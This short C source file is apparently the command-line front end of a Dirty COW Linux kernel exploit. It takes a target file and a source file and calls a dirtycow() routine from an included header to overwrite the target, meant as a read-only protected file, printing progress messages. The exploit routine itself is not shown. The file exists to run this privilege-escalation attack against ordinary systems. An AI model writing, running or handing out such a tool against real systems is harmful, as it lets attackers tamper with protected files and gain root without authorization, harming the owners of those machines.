#include <stdio.h>
#include <unistd.h>

#include "dirtycow.h"


int main(int argc, const char *argv[]) {

	const char *target_file, *source_file;

	if( argc != 3 ) {
		printf("usage: <target file>  <src file>\n");
		return 1;
	}

	target_file = argv[1];
	source_file = argv[2];
	
	printf("[+] start replacing %s by %s\n", target_file, source_file);
	if(dirtycow(target_file, source_file)) {
		printf("ERROR: could not dirtycow %s with %s\n", target_file, source_file);
		return 1;
	}

	printf("[+] %s replaced done!\n", target_file);

	return 0;
}
